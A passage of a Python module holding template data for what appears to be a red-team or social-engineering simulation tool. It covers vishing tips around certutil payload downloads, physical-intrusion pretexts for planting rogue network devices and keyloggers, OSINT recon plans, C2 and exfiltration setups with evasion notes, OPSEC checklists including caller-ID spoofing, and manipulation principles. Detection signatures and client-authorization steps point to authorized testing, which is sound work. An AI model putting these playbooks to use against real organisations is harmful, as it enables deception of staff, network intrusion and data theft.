  ✗ Don't ask them to run unfamiliar executable files — stick to built-in Windows tools
  ✗ Don't use commands that obviously contain encoded payloads visible in the command line
  ✗ Don't rush through the commands — explain each step as if teaching
  ✗ Don't ask for more than 2-3 commands — keep it simple and focused
  ✓ Know certutil flags and be able to explain what each does
  ✓ Have a legitimate-sounding domain for the download URL
  ✓ Reference real certificate issues (root CA expiry, intermediate cert missing)
  ✓ Send a follow-up email with 'documentation' of the procedure as additional payload delivery""",
    },
]

# ═══════════════════════════════════════════════════════════════
#  PHYSICAL ACCESS PRETEXTS
# ═══════════════════════════════════════════════════════════════

PHYSICAL_PRETEXTS = [
    {
        "id": "hvac_technician",
        "name": "HVAC Technician",
        "appearance": "Branded polo or uniform shirt, tool belt, clipboard with work orders, safety glasses, steel-toe boots",
        "props": [
            "Printed work order with target company address and building management logo",
            "Multimeter and basic HVAC tools",
            "Flashlight",
            "Generic HVAC company badge with photo",
            "High-vis vest",
        ],
        "script": """I'm here for the scheduled HVAC inspection on floor {floor}.
Building management should have sent a notice last week - I can show you the work order.
I need access to the server room to check the cooling units.
We've been getting temperature alerts from this building and the last thing
anyone wants is equipment overheating over the weekend.""",
        "target_areas": ["Server rooms", "Network closets", "Mechanical rooms", "Rooftop access", "Basement infrastructure"],
        "objectives": [
            "Plant a rogue network device (LAN Turtle, Raspberry Pi, WiFi Pineapple)",
            "Photograph network equipment labels and IP configurations",
            "Access unlocked workstations in server room",
            "Map physical security controls (cameras, badge readers, locks)",
            "Tailgate through secured doors while carrying equipment",
        ],
    },
    {
        "id": "fire_inspector",
        "name": "Fire Safety Inspector",
        "appearance": "Business casual with high-visibility vest, clipboard, camera, official-looking laminated badge",
        "props": [
            "Fire inspection checklist (printed, official-looking)",
            "Camera for 'documentation of extinguisher placements'",
            "Badge with generic fire safety company name and photo",
            "Measuring tape",
            "Flashlight",
        ],
        "script": """Hi, I'm {name} from {fire_safety_company}. We're conducting the annual
fire suppression system inspection for this building. I'll need access to
all floors including restricted areas to verify extinguisher placements
and inspect the sprinkler system. This is required by fire code and
building management has it on the schedule. Who do I check in with?""",
        "target_areas": ["All floors including restricted areas", "Server rooms (fire suppression systems)", "Stairwells and emergency exits", "Electrical rooms", "Executive floors"],
        "objectives": [
            "Gain unrestricted building access with legitimate-sounding authority",
            "Photograph office layouts, security camera positions, and badge reader locations",
            "Test physical security response to an unfamiliar person in restricted areas",
            "Access server rooms under fire suppression pretext",
            "Identify unlocked offices and unattended workstations",
        ],
    },
    {
        "id": "delivery_driver",
        "name": "Delivery / Courier",
        "appearance": "Casual clothing, carrying branded boxes (Amazon, FedEx, UPS), possibly with a hand truck for larger deliveries",
        "props": [
            "Branded shipping boxes (Amazon, FedEx, or similar)",
            "Clipboard with printed delivery manifest showing target's name",
            "Hand truck for large package deliveries",
            "USB drop devices concealed inside packages",
            "Printed shipping label with correct company address",
        ],
        "script": """Delivery for {target_name} in {department}. I was told to deliver
directly to their desk - it's marked fragile and confidential so I can't
just leave it at reception. I need a signature from them personally.
Can someone walk me over? I've got more deliveries to make so I'm
kind of in a rush.""",
        "target_areas": ["Reception and lobby", "Mail room", "Target's office or desk area", "Common areas and break rooms"],
        "objectives": [
            "Bypass lobby security by carrying legitimate-looking packages",
            "Access internal office areas beyond reception",
            "Drop USB devices in common areas or on desks",
            "Observe badge systems, door codes, and security procedures",
            "Deliver a package containing a rogue device to a specific person",
        ],
    },
    {
        "id": "telecom_technician",
        "name": "Telecom / Internet Technician",
        "appearance": "Branded ISP polo or jacket, tool belt, cable tester, laptop bag, hard hat if entering utility areas",
        "props": [
            "ISP-branded uniform or polo shirt",
            "Cable tester and ethernet crimping tools",
            "Laptop with network diagnostic software",
            "Printed work order referencing reported connectivity issues",
            "Badge with ISP company logo",
        ],
        "script": """Hi, I'm from {isp_name}. We received a ticket about intermittent
connectivity issues affecting this floor. I need to check the network
closet and trace the cabling back to the demarc point. It shouldn't
take more than 30 minutes. Can someone show me where the network
closet is? I also need to plug in my diagnostic tool to run some tests.""",
        "target_areas": ["Network closets and wiring panels", "Server rooms", "Demarc point / telecom room", "Under-desk cabling access"],
        "objectives": [
            "Plant a network tap or rogue device in the network closet",
            "Connect a device to a live network port for remote access",
            "Photograph network topology and cable labels",
            "Map internal network infrastructure and VLAN configurations",
            "Identify unencrypted network traffic or insecure protocols",
        ],
    },
    {
        "id": "copier_technician",
        "name": "Copier / Printer Technician",
        "appearance": "Business casual with vendor polo shirt, rolling tool case, laptop bag, badge with printer vendor logo",
        "props": [
            "Vendor-branded polo shirt (Canon, Ricoh, Xerox, or HP)",
            "Rolling tool case with basic tools and toner cartridges",
            "Laptop for 'diagnostics and firmware updates'",
            "Printed service ticket referencing specific printer model and floor",
            "Badge with vendor company logo and photo",
        ],
        "script": """Hi, I'm {name} from {printer_vendor}. We received an automated alert
that the {printer_model} on floor {floor} is due for maintenance and a firmware
update. I'll need to access the printer directly and connect my laptop for the
firmware push. I also need to check the network connectivity on the print server
side. This should take about 45 minutes. I may need to visit printers on
other floors as well — our system flagged a few others for the same update.""",
        "target_areas": ["Office floors with networked printers", "Print rooms and copy centers", "Network closets where print servers connect", "Executive floors (high-value targets)", "Multiple floors for 'batch maintenance'"],
        "objectives": [
            "Plant network implant via printer's ethernet connection",
            "Access multiple floors under cover of 'batch maintenance'",
            "Harvest credentials from print server or cached print jobs",
            "Install rogue device on network ports near printers",
            "Map office layout and identify high-value workstations during floor traversal",
        ],
    },
    {
        "id": "it_asset_inventory",
        "name": "IT Asset Inventory Specialist",
        "appearance": "Business casual, clipboard with asset tracking spreadsheet, barcode scanner, laptop, lanyard with IT department badge",
        "props": [
            "Clipboard with printed asset inventory spreadsheet showing existing records",
            "USB barcode scanner for 'scanning asset tags'",
            "Laptop with 'asset management software' open",
            "Camera for 'photographing asset tags and serial numbers'",
            "IT department badge (generic or spoofed)",
        ],
        "script": """Hey, I'm {name} from IT Asset Management. We're doing the annual
hardware inventory for {company} — every workstation, monitor, and network device
needs to be verified. I need to physically scan the asset tag on each machine
and verify the serial number matches our records. I'll be going desk by desk
on floor {floor} today. Building management and your department head were
notified last week. I'll try to be quick and not disrupt anyone.""",
        "target_areas": ["Every desk and workstation on target floor", "Server rooms and network closets", "Conference rooms with AV equipment", "Storage rooms with spare hardware", "Executive offices"],
        "objectives": [
            "Gain prolonged, systematic access to every workstation in the building",
            "Photograph screens, sticky notes, and whiteboards for credential harvesting",
            "Connect USB devices (keyloggers, implants) while 'scanning asset tags'",
            "Map the entire network topology by documenting connected devices",
            "Identify unattended and unlocked workstations for exploitation",
        ],
    },
]

# ═══════════════════════════════════════════════════════════════
#  RECONNAISSANCE TEMPLATES
# ═══════════════════════════════════════════════════════════════

RECON_TEMPLATES = [
    {
        "id": "osint_full",
        "name": "Full OSINT Reconnaissance",
        "description": "Comprehensive open-source intelligence plan targeting organizational structure, technology stack, and personnel",
        "passive_tasks": [
            "Enumerate {company} email naming convention via LinkedIn profiles",
            "Harvest employee names, titles, and departments from LinkedIn",
            "Identify technology stack from job postings ({company} careers page, Indeed, Glassdoor)",
            "Map organizational hierarchy from public filings and press releases",
            "Search for leaked credentials in breach databases (Have I Been Pwned, DeHashed)",
            "Enumerate subdomains via Certificate Transparency logs (crt.sh)",
            "Gather DNS records (MX, TXT, SPF, DMARC) for mail infrastructure",
            "Search GitHub/GitLab for {company} repos, exposed secrets, internal docs",
            "Review {company} social media for operational details",
            "Search Shodan/Censys for internet-facing assets and open ports",
        ],
        "active_tasks": [
            "Port scan external perimeter hosts (nmap -sC -sV)",
            "Enumerate web applications and identify frameworks (whatweb, Wappalyzer)",
            "Test for subdomain takeover on unused DNS records",
            "Probe external-facing login portals (VPN, OWA, Citrix, SSO)",
            "Send benign emails to validate email address format and delivery",
            "Map WiFi networks from parking lot (ESSID, encryption, signal strength)",
        ],
        "tools": [
            ("theHarvester", "Email and subdomain enumeration"),
            ("Maltego", "Visual link analysis and entity graphing"),
            ("Recon-ng", "Automated OSINT framework"),
            ("Shodan/Censys", "Internet-facing asset discovery"),
            ("LinkedIn Sales Navigator", "Employee and org structure profiling"),
            ("SpiderFoot", "Automated OSINT collection"),
            ("crt.sh", "Certificate Transparency log search"),
            ("Amass", "Subdomain enumeration and network mapping"),
        ],
        "deliverables": [
            "Target employee list with emails, roles, and social profiles",
            "Technology stack inventory (external-facing and inferred internal)",
            "Network topology map of external perimeter",
            "Credential breach exposure report",
            "Social engineering target shortlist ranked by access and vulnerability",
            "Attack surface summary with prioritized entry points",
        ],
    },
    {
        "id": "tech_profiling",
        "name": "Technology Stack Profiling",
        "description": "Focused reconnaissance on the target's technology infrastructure to identify attack vectors",
        "passive_tasks": [
            "Analyze {company} job postings for technology mentions ({software} admin, {software} developer)",
            "Search BuiltWith/Wappalyzer for web technology fingerprints",
            "Enumerate DNS records for cloud provider indicators (AWS, Azure, GCP)",
            "Search Stack Overflow and forums for {company} employee technical questions",
            "Check Shodan for exposed {software} instances and version numbers",
            "Review vendor case studies mentioning {company} deployments",
        ],
        "active_tasks": [
            "Fingerprint web servers and frameworks (HTTP headers, cookies, error pages)",
            "Enumerate SSL/TLS configurations and certificate chains",
            "Test for known CVEs against identified software versions",
            "Map CDN and WAF presence (Cloudflare, Akamai, AWS CloudFront)",
            "Probe API endpoints for versioning and documentation exposure",
        ],
        "tools": [
            ("Wappalyzer", "Web technology fingerprinting"),
            ("BuiltWith", "Technology stack lookup"),
            ("Shodan", "Internet-facing service detection"),
            ("Nmap", "Port scanning and service version detection"),
            ("Nuclei", "Vulnerability scanning against known templates"),
            ("WhatWeb", "Web server and application fingerprinting"),
        ],
        "deliverables": [
            "Confirmed technology stack inventory with versions",
            "Known vulnerability assessment per identified technology",
            "Cloud infrastructure mapping (provider, regions, services)",
            "Prioritized list of potentially exploitable services",
        ],
    },
    {
        "id": "personnel_mapping",
        "name": "Personnel and Social Engineering Mapping",
        "description": "Identification and profiling of key personnel for social engineering targeting",
        "passive_tasks": [
            "Build org chart from LinkedIn (C-suite to VPs to Directors to Managers to IC)",
            "Identify IT administrators and security team members from job titles",
            "Map {department} department personnel and reporting structure",
            "Profile high-value targets: executive assistants, finance team, HR leads",
            "Harvest personal details from social media (interests, travel, events)",
            "Identify recently hired employees (less established, more susceptible)",
            "Search conference speaker lists for {company} presenters (technical detail leaks)",
            "Map vendor relationships from LinkedIn connections and press releases",
        ],
        "active_tasks": [
            "Validate email addresses via SMTP VRFY or calibration emails",
            "Identify out-of-office patterns (vacation schedules, conference attendance)",
            "Test phone system for auto-attendant with employee directory",
            "Attempt LinkedIn connections with pretext profiles for extended profiling",
        ],
        "tools": [
            ("LinkedIn Sales Navigator", "Professional network profiling"),
            ("Hunter.io", "Email format verification"),
            ("Pipl/BeenVerified", "Personal information aggregation"),
            ("social-analyzer", "Social media OSINT"),
            ("PhoneInfoga", "Phone number OSINT"),
        ],
        "deliverables": [
            "Target personnel dossiers (name, role, contact, social profiles, interests)",
            "Organizational hierarchy chart with reporting lines",
            "Social engineering susceptibility ranking per target",
            "Pretext development notes per high-value target",
            "Vendor and third-party relationship map",
        ],
    },
]

# ═══════════════════════════════════════════════════════════════
#  C2 (COMMAND AND CONTROL) TEMPLATES
# ═══════════════════════════════════════════════════════════════

C2_TEMPLATES = [
    {
        "id": "https_beacon",
        "name": "HTTPS Beaconing C2",
        "protocol": "HTTPS",
        "description": "Standard HTTPS-based command and control using domain categorization for evasion",
        "infrastructure": [
            "Register aged domain (30+ days) with categorization matching target industry",
            "Obtain valid TLS certificate (Let's Encrypt) for the C2 domain",
            "Configure reverse proxy (Nginx/Caddy) with legitimate-looking default page",
            "Set up redirector to filter analyst traffic from real C2 traffic",
            "Deploy C2 server behind redirector (Cobalt Strike, Sliver, Mythic)",
        ],
        "beacon_config": {
            "sleep": "60-300 seconds with 30% jitter",
            "user_agent": "Mozilla/5.0 matching target's browser profile",
            "uri_paths": ["/api/v2/check", "/cdn/status", "/updates/config"],
            "fallback": "DNS beaconing over TXT records to backup domain",
        },
        "cover_story": "Traffic appears as HTTPS requests to a legitimate SaaS analytics platform. URI paths mimic standard API health checks. Request/response sizes match normal JSON API payloads.",
        "evasion_notes": [
            "Beacon during business hours only (08:00-18:00 target timezone)",
            "Match TLS JA3 fingerprint to legitimate browser",
            "Use domain categorization (CDN, SaaS, analytics) to bypass web filters",
            "Vary beacon intervals to avoid statistical detection",
            "Encrypt payload within normal-looking JSON responses",
        ],
        "detection_signatures": [
            "Repeated connections to low-reputation domain on fixed interval",
            "TLS certificate issued to recently registered domain",
            "Unusual JA3 fingerprint for claimed user-agent",
            "POST requests with encoded payloads to non-standard URIs",
        ],
    },
    {
        "id": "dns_tunnel",
        "name": "DNS Tunneling C2",
        "protocol": "DNS",
        "description": "Command and control via DNS queries, useful when HTTP/HTTPS is filtered",
        "infrastructure": [
            "Register domain and configure NS delegation to attacker-controlled server",
            "Deploy DNS C2 server (dnscat2, Cobalt Strike DNS, iodine)",
            "Configure authoritative DNS to handle encoded queries",
            "Set up fallback domain with different registrar",
            "Ensure recursive resolvers in target network allow external DNS",
        ],
        "beacon_config": {
            "sleep": "30-120 seconds",
            "user_agent": "N/A (DNS protocol)",
            "uri_paths": ["TXT and CNAME records for data encoding"],
            "fallback": "Direct HTTPS to backup domain if DNS blocked",
        },
        "cover_story": "DNS queries appear as standard subdomain lookups. The authoritative DNS server responds with TXT records that could pass as SPF or DKIM configuration data.",
        "evasion_notes": [
            "Keep subdomain labels under 63 chars (DNS spec limit)",
            "Use mixed query types (A, AAAA, TXT, CNAME) to avoid pattern detection",
            "Rate limit queries to match normal DNS volume",
            "Avoid queries during off-hours when DNS baseline is low",
            "Use legitimate-looking domain name (not random strings)",
        ],
        "detection_signatures": [
            "High volume of DNS queries to single domain",
            "Unusually long subdomain labels (encoded data)",
            "TXT record responses with non-standard content",
            "DNS queries to recently registered domains",
        ],
    },
    {
        "id": "domain_fronting",
        "name": "Domain Fronting C2",
        "protocol": "HTTPS (CDN)",
        "description": "C2 traffic routed through legitimate CDN to evade network monitoring",
        "infrastructure": [
            "Identify CDN provider used by target (CloudFront, Azure CDN, Fastly)",
            "Register C2 domain and configure CDN distribution",
            "Configure C2 server as CDN origin",
            "Set up host header manipulation in implant",
            "Test domain fronting path end-to-end before deployment",
        ],
        "beacon_config": {
            "sleep": "120-600 seconds with 50% jitter",
            "user_agent": "Mozilla/5.0 matching target's browser profile",
            "uri_paths": ["Standard CDN resource paths"],
            "fallback": "Direct HTTPS to alternative domain",
        },
        "cover_story": "All traffic appears as HTTPS requests to a major CDN provider. Network monitoring sees only connections to trusted CDN IP ranges. The actual C2 domain is hidden in the encrypted Host header.",
        "evasion_notes": [
            "Use CDN domains already trusted by the target's proxy/firewall",
            "Match request patterns to legitimate CDN traffic (caching headers, content types)",
            "Some CDN providers have disabled domain fronting — verify before use",
            "Keep payload sizes consistent with normal CDN responses",
            "Rotate CDN distributions periodically",
        ],
        "detection_signatures": [
            "Mismatch between SNI (TLS) and Host header (requires TLS inspection)",
            "Repeated CDN requests to unusual distribution IDs",
            "CDN traffic patterns inconsistent with legitimate content delivery",
            "POST requests to CDN endpoints (unusual for static content)",
        ],
    },
    {
        "id": "exfil_channel",
        "name": "Data Exfiltration Channel",
        "protocol": "Multi-protocol",
        "description": "Covert data exfiltration plan using multiple channels for redundancy",
        "infrastructure": [
            "Set up cloud storage for staged exfiltration (OneDrive, Google Drive, Dropbox)",
            "Configure DNS exfil server for low-and-slow extraction",
            "Prepare HTTPS upload endpoint with valid TLS certificate",
            "Set up steganography toolkit for embedding data in images",
            "Prepare encrypted file transfer mechanism (age, GPG)",
        ],
        "beacon_config": {
            "sleep": "Varies by channel (batch uploads during peak hours)",
            "user_agent": "Matches cloud storage client user-agent",
            "uri_paths": ["Cloud storage API endpoints"],
            "fallback": "DNS TXT record encoding for small payloads",
        },
        "cover_story": "Exfiltration mimics normal business activities: cloud storage syncs, email attachments, and document sharing. Chunk sizes match typical file upload patterns.",
        "evasion_notes": [
            "Compress and encrypt before exfil (reduces volume, prevents DLP inspection)",
            "Use legitimate cloud storage APIs already allowed through the firewall",
            "Spread exfil across multiple channels and time windows",
            "Match upload sizes to normal business document uploads (500KB-2MB)",
            "Avoid bulk transfers — drip data over days/weeks",
            "Use protocol-compliant channels (HTTPS, DNS) to blend with legitimate traffic",
        ],
        "detection_signatures": [
            "DLP: unusual volume of data to external cloud storage",
            "Network: large uploads to personal cloud accounts",
            "DNS: high volume of TXT queries to single domain",
            "Endpoint: compression/encryption tools run before uploads",
        ],
    },
]

# ═══════════════════════════════════════════════════════════════
#  OPSEC CHECKLISTS (per scenario type)
# ═══════════════════════════════════════════════════════════════

OPSEC_CHECKLISTS = {
    "phishing": [
        "Register lookalike domain 30+ days before engagement",
        "Warm up sending domain with legitimate email traffic",
        "Configure SPF, DKIM, and DMARC on sending domain",
        "Test email delivery against target's gateway (non-malicious probe)",
        "Stage landing page with valid TLS and realistic content",
        "Use separate VPN/proxy for campaign management",
        "Ensure payload has no analyst-attributable strings or metadata",
        "Prepare domain takedown plan for post-engagement cleanup",
    ],
    "vishing": [
        "Spoof caller ID to match target organization's PBX numbers",
        "Research target's communication style if impersonating specific personnel",
        "Prepare fallback answers for common verification questions",
        "Use burner phone or VoIP with disposable number",
        "Record calls only with client authorization (legal requirement)",
        "Practice scripts to sound natural, not robotic",
        "Know the target's org chart and recent events for credibility",
        "Have a graceful exit plan if the target becomes suspicious",
    ],
    "smishing": [
        "Use dedicated SMS gateway or spoofed sender ID",
        "Rotate sending numbers to avoid carrier blocking",
        "Keep messages under 160 chars for single SMS delivery",
        "Register domains that pass mobile browser URL bar inspection",
        "Test delivery against target carrier's SMS filtering",
        "Time delivery for business hours when targets are responsive",
    ],
    "quishing": [
        "Print QR codes at professional quality (avoid pixelation)",
        "Test QR codes with multiple scanner apps before deployment",
        "Place QR materials during off-hours to avoid witnesses",
        "Prepare explanation if questioned about placing materials",
        "Document exact placement locations for cleanup after engagement",
        "Use legitimate-looking printed materials (laminated, branded)",
    ],
    "physical": [
        "Acquire authentic uniform and props for cover identity",
        "Print work orders with correct company address and building details",
        "Research building entry procedures and security checkpoints",
        "Identify camera blind spots from public footage or prior recon",
        "Have printed badge with photo and vendor/company branding",
        "Prepare cover story for every area you plan to access",
        "Know names of facilities and building management contacts",
        "Carry authorization letter from client as panic card",
    ],
    "recon": [
        "Use VPN and anonymized browser for all OSINT activities",
        "Avoid logging into personal accounts during reconnaissance",
        "Use disposable email for any online tool registrations",
        "Rate-limit active scanning to avoid IDS/IPS alerts",
        "Document all queries for the final report and deconfliction",
        "Use Tor or proxy chains for sensitive lookups",
    ],
    "c2": [
        "Register infrastructure through privacy-protected registrars",
        "Use separate payment methods for each piece of infrastructure",
        "Test C2 comms against commercial EDR before deployment",
        "Configure kill switch for rapid infrastructure teardown",
        "Rotate C2 domains on a scheduled basis",
        "Ensure all operator connections use VPN/Tor",
        "Log all C2 sessions for engagement reporting",
    ],
}

# ═══════════════════════════════════════════════════════════════
#  PSYCHOLOGICAL PRINCIPLES
# ═══════════════════════════════════════════════════════════════

PSYCH_PRINCIPLES = {
    "authority": {
        "name": "Authority",
        "description": "People comply with perceived authority figures",
        "application": "Impersonate executives, IT admins, auditors, or law enforcement",
        "example": "The CISO asked me to verify all accounts in your department today.",
    },
    "urgency": {
        "name": "Urgency / Scarcity",
        "description": "Time pressure reduces critical thinking",
        "application": "Create artificial deadlines, reference active incidents or expiring access",
        "example": "Your account will be locked in 30 minutes if you don't verify.",
    },
    "social_proof": {
        "name": "Social Proof",
        "description": "People follow what others are doing",
        "application": "Reference colleagues who have already complied",
        "example": "Everyone in your department has already completed this - you're the last one.",
    },
    "reciprocity": {
        "name": "Reciprocity",
        "description": "People feel obligated to return favors",
        "application": "Help the target with something first, then make your real request",
        "example": "I just fixed your printer issue. By the way, can you badge me into the server room?",
    },
    "liking": {
        "name": "Liking / Rapport",
        "description": "People comply more with those they like",
        "application": "Build rapport through small talk and common ground before making requests",
        "example": "Oh you're into cycling too? Anyway, quick favor - can you check something for me?",
    },
    "commitment": {
        "name": "Commitment / Consistency",
        "description": "Once someone agrees to something small, they'll agree to bigger asks",
        "application": "Start with innocent questions and gradually escalate to sensitive requests",
        "example": "Can you confirm your department? Great. And your role? Perfect. Now can you verify your employee ID for our records?",
    },
}

# ═══════════════════════════════════════════════════════════════
#  FAKE DOCUMENT NAMES
# ═══════════════════════════════════════════════════════════════

FAKE_DOCUMENTS = [
    "Q4_Financial_Review_2025.xlsx",
    "Employee_Password_Policy_Update.docx",
    "Vendor_Contract_Renewal_Notice.pdf",
    "Internal_Security_Audit_Findings.pptx",
    "Confidential_Client_List.xlsx",
    "Executive_Board_Meeting_Agenda.docx",
    "IT_Support_Ticket.pdf",
    "HR_Payroll_Compliance_Audit_2025.xlsx",
    "Critical_Software_Patch_Deployment_Instructions.docx",
    "Phishing_Simulation_Report.pdf",
    "Incident_Response_Plan_Update.docx",
    "Employee_Onboarding_Checklist.xlsx",
    "Vendor_Security_Assessment.pdf",
    "Annual_Security_Training_Enrollment.docx",
    "Bonus_Structure_2025.xlsx",
    "Organizational_Chart_2025.pptx",
    "Layoff_Notices_Q1_2026.docx",
    "Personal_Performance_Review_2025.xlsx",
]


def get_localized_templates(lang="en"):
    """Return all template data structures for the given language.

    For 'en', returns existing module-level constants unchanged.
    For other languages, loads the locale and overlays translated fields
    onto the English structure, preserving non-translatable fields.
    """
    if lang == "en":
        return {
            "INDUSTRIES": INDUSTRIES,
            "PERSONAS": PERSONAS,
            "URGENCY_TRIGGERS": URGENCY_TRIGGERS,
            "SEASONAL_HOOKS": SEASONAL_HOOKS,
            "PHISHING_TEMPLATES": PHISHING_TEMPLATES,
            "SMISHING_TEMPLATES": SMISHING_TEMPLATES,
            "QUISHING_TEMPLATES": QUISHING_TEMPLATES,
            "VISHING_SCRIPTS": VISHING_SCRIPTS,
            "PHYSICAL_PRETEXTS": PHYSICAL_PRETEXTS,
            "PSYCH_PRINCIPLES": PSYCH_PRINCIPLES,
            "FAKE_DOCUMENTS": FAKE_DOCUMENTS,
            "RECON_TEMPLATES": RECON_TEMPLATES,
            "C2_TEMPLATES": C2_TEMPLATES,
            "OPSEC_CHECKLISTS": OPSEC_CHECKLISTS,
        }

    from .locales import load_locale
    strings = load_locale(lang)

    # Overlay translated industry fields, keep software from English
    loc_industries = {}
    for key, en_data in INDUSTRIES.items():
        loc = strings.get("industries", {}).get(key, {})
        loc_industries[key] = {
            "name": loc.get("name", en_data["name"]),
            "departments": loc.get("departments", en_data["departments"]),
            "software": en_data["software"],
            "jargon": loc.get("jargon", en_data["jargon"]),
            "pain_points": loc.get("pain_points", en_data["pain_points"]),
        }

    # Overlay translated persona fields
    loc_personas = {}
    for key, en_data in PERSONAS.items():
        loc = strings.get("personas", {}).get(key, {})
        loc_personas[key] = {
            "name": loc.get("name", en_data["name"]),
            "titles": loc.get("titles", en_data["titles"]),
            "pretexts": loc.get("pretexts", en_data["pretexts"]),
        }

    # Overlay list-based template arrays
    def _overlay_list(en_list, loc_list, fields):
        result = []
        for i, en_item in enumerate(en_list):
            loc_item = loc_list[i] if i < len(loc_list) else {}
            merged = {"id": en_item["id"]}
            for f in fields:
                merged[f] = loc_item.get(f, en_item.get(f))
            result.append(merged)
        return result

    loc_phishing = _overlay_list(
        PHISHING_TEMPLATES,
        strings.get("phishing_templates", []),
        ["name", "subject_lines", "body"],
    )
    loc_smishing = _overlay_list(
        SMISHING_TEMPLATES,
        strings.get("smishing_templates", []),
        ["name", "messages"],
    )
    loc_quishing = _overlay_list(
        QUISHING_TEMPLATES,
        strings.get("quishing_templates", []),
        ["name", "pretext_text", "delivery_methods", "placement_suggestions", "objectives"],
    )
    loc_vishing = _overlay_list(
        VISHING_SCRIPTS,
        strings.get("vishing_scripts", []),
        ["name", "opening", "escalation", "objective", "red_flags_to_avoid"],
    )
    loc_physical = _overlay_list(
        PHYSICAL_PRETEXTS,
        strings.get("physical_pretexts", []),
        ["name", "appearance", "props", "script", "target_areas", "objectives"],
    )

    # Overlay psych principles
    loc_psych = {}
    for key, en_data in PSYCH_PRINCIPLES.items():
        loc = strings.get("psych_principles", {}).get(key, {})
        loc_psych[key] = {
            "name": loc.get("name", en_data["name"]),
            "description": loc.get("description", en_data["description"]),
            "application": loc.get("application", en_data["application"]),
            "example": loc.get("example", en_data["example"]),
        }

    return {
        "INDUSTRIES": loc_industries,
        "PERSONAS": loc_personas,
        "URGENCY_TRIGGERS": strings.get("urgency_triggers", URGENCY_TRIGGERS),
        "SEASONAL_HOOKS": strings.get("seasonal_hooks", SEASONAL_HOOKS),
        "PHISHING_TEMPLATES": loc_phishing,
        "SMISHING_TEMPLATES": loc_smishing,
        "QUISHING_TEMPLATES": loc_quishing,
        "VISHING_SCRIPTS": loc_vishing,
        "PHYSICAL_PRETEXTS": loc_physical,
        "PSYCH_PRINCIPLES": loc_psych,
        "FAKE_DOCUMENTS": strings.get("fake_documents", FAKE_DOCUMENTS),
        "RECON_TEMPLATES": RECON_TEMPLATES,
        "C2_TEMPLATES": C2_TEMPLATES,
        "OPSEC_CHECKLISTS": OPSEC_CHECKLISTS,
    }